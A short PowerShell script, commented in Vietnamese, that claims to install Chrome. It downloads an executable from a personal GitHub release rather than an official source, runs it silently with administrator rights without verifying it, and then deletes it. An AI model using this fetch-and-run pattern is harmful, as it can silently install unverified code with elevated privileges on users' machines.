# Script để tải xuống và cài đặt Chrome

# Chạy với quyền quản trị viên (Run as Administrator)

$Path = $ENV:TEMP
$Installer = "ChromeSetup.exe"

Write-Host "Dang tai xuong Chrome..."

# Tải file cài đặt
Invoke-WebRequest "https://github.com/hiepvk/ipa/releases/download/exe/ChromeSetup.exe" -OutFile "$Path\$Installer"

Write-Host "Da tai xuong thanh cong."
Write-Host "Dang bat dau qua trinh cai dat..."

# Run the installer in silent mode with administrator privileges
Start-Process -FilePath "$Path\$Installer" -Args "/silent /install" -Verb RunAs -Wait

Write-Host "Cai dat hoan tat."
Write-Host "Dang don dep file cai dat..."

# Delete the downloaded installer file
Remove-Item "$Path\$Installer" -ErrorAction SilentlyContinue

Write-Host "Hoan tat."
